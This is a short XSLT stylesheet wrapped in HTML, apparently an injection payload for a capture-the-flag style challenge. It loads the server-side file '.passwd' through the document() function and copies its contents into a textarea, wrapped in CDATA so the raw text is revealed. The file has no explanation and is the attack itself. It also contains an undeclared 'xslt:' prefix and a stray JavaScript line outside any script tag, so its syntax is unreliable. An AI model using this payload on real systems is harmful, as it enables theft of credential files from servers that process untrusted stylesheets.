<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:variable name="file" select="document('.passwd')"/>
<textarea id="copyOf" rows="10" cols="100">
  <xslt:text disable-output-escaping="yes">
    &lt;![CDATA[
  </xslt:text>
  <xsl:copy-of select="$file"/>
  <xslt:text disable-output-escaping="yes">
    ]]&gt;
  </xslt:text>
</textarea>

var copyOf = document.getElementById("copyOf").value;
</body>
</html> 
